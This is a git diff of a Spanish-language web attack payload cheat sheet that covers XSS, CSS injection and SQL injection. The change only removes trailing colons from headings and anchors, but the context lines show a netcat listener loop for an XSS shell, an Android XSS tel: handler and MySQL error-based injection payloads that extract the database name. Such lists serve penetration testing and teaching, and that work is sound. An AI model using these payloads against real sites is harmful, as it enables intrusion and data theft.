@@ -27,7 +27,7 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
    * [xss shell](#xss-shell)
    * [eventos](#eventos)
    * [xss en android](#xss-en-android)
-   * [xss en android para iniciar llamada y enviar mensajes de texto:](#xss-en-android-para-iniciar-llamada-y-enviar-mensajes-de-texto:)
+   * [xss en android para iniciar llamada y enviar mensajes de texto](#xss-en-android-para-iniciar-llamada-y-enviar-mensajes-de-texto)
    * [xss javascript navigator](#xss-javascript-navigator)
    * [Muchos mas:](#Muchosmas:)
 * [Css injection](#Css-injection)
@@ -55,7 +55,7 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
         * [Sql inyection usando las funciones HEX-UNHEX](#Sql-inyection-usando-las-funciones-HEX-UNHEX)
         * [Inyección sql tipo error based usando Extractvalue](#Inyección-sql-tipo-error-based-usando-Extractvalue)
         * [Sql inyection payload usando reverse](#Sql-inyection-payload-usando-reverse)
-        * [Sql inyection payload usando extractvalue:](#Sql-inyection-payload-usando-extractvalue:)
+        * [Sql inyection payload usando extractvalue](#Sql-inyection-payload-usando-extractvalue)
         * [Sql inyection payload + url encode + timing](#Sql-inyection-payload-+-url-encode-+-timing)
     * [Sql inyection + dios sql](#Sql-inyection-+-dios-sql)
     * [Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection](#Sql-inyection-Buffer-Overflow-/-Firewall-Crash-bypass-+-xss-inyection)
@@ -417,7 +417,7 @@ while :; do printf "Y000>$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
 
 ```
 
-## xss en android para iniciar llamada y enviar mensajes de texto:
+## xss en android para iniciar llamada y enviar mensajes de texto
 
 ```
 onclick="window.location.href='tel:00000000000';"
@@ -931,7 +931,7 @@ SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*
 
 `reverse(right(reverse(data),1))`
 
-### Sql inyection payload usando extractvalue:
+### Sql inyection payload usando extractvalue
 
 `extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))`
 
